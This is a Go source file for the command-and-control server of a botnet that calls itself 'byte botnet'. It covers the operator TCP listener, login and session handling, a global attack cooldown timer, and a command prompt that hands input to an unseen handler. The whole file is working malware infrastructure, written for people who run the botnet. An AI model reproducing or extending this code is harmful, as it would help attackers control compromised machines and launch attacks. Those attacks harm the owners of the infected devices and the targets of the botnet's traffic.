package cnc

import (
	"bufio"
	"cnc/internal/config"
	"cnc/internal/handlers"
	"cnc/internal/state"
	"cnc/internal/ui"
	"cnc/internal/util"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func CncListener(port int) {
	listenAddr := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		fmt.Printf("Failed to bind CNC listener on port %d: %v\n", port, err)
		os.Exit(1)
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleClient(conn)
	}
}

func ManageCooldown() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		state.CooldownMutex.Lock()
		if state.GlobalCooldown > 0 {
			state.GlobalCooldown--
		}
		state.CooldownMutex.Unlock()
	}
}

func handleClient(conn net.Conn) {
	var userIndex = -1
	defer func() {
		if userIndex != -1 {
			state.UsersMutex.Lock()
			state.Users[userIndex].IsLoggedIn = false
			state.UsersMutex.Unlock()

			state.UserSocketsMutex.Lock()
			state.UserSockets[userIndex] = nil
			state.UserSocketsMutex.Unlock()
		}
		conn.Close()
	}()

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	reader := bufio.NewReader(conn)

	conn.Write([]byte(ui.WHITE + "\rLogin : " + ui.RESET))
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)

	conn.Write([]byte(ui.WHITE + "\rPassword : " + ui.RESET))
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	userIndex = config.CheckLogin(username, password)

	if userIndex == -1 {
		conn.Write([]byte(ui.RED + "\rInvalid login" + ui.RESET + "\r\n"))
		return
	}

	if userIndex == -2 {
		conn.Write([]byte(ui.YELLOW + "\rUser connected already, Disconnect? Y/N: " + ui.RESET))
		response, _ := reader.ReadString('\n')
		response = strings.TrimSpace(response)
		if strings.ToUpper(response) == "Y" {
			state.UserSocketsMutex.Lock()
			state.UsersMutex.Lock()
			for i := 0; i < state.UserCount; i++ {
				if state.Users[i].User == username {
					if state.UserSockets[i] != nil {
						state.UserSockets[i].Close()
						state.UserSockets[i] = nil
					}
					state.Users[i].IsLoggedIn = false
					break
				}
			}
			state.UsersMutex.Unlock()
			state.UserSocketsMutex.Unlock()
			userIndex = config.CheckLogin(username, password)
		} else {
			return
		}
	}

	if userIndex < 0 {
		conn.Write([]byte(ui.RED + "\rCould not establish session." + ui.RESET + "\r\n"))
		return
	}

	state.UsersMutex.Lock()
	user := &state.Users[userIndex]
	user.IsLoggedIn = true
	state.UsersMutex.Unlock()

	state.UserSocketsMutex.Lock()
	state.UserSockets[userIndex] = conn
	state.UserSocketsMutex.Unlock()

	conn.Write([]byte(ui.CLEAR + "\r\n\nWelcome to " + ui.WHITE + "byte botnet!\n\rBest Raw power, do what ever you want and enjoy!\r\n\n\n\n\n\n\n\n\n\n\n"))

	userIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

	go ui.UpdateTitle(conn, user)

	for {
		prompt := fmt.Sprintf(ui.WHITE+"\r[%s"+ui.GREY+"@"+ui.WHITE+"byte ~]# "+ui.WHITE, user.User)
		conn.Write([]byte(prompt))

		command, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		command = strings.TrimSpace(command)

		if len(command) > 0 {
			response := handlers.ProcessCommand(user, command, conn, userIP)
			if response != "" {
				util.WriteToConn(conn, response)
			}
		}
	}
}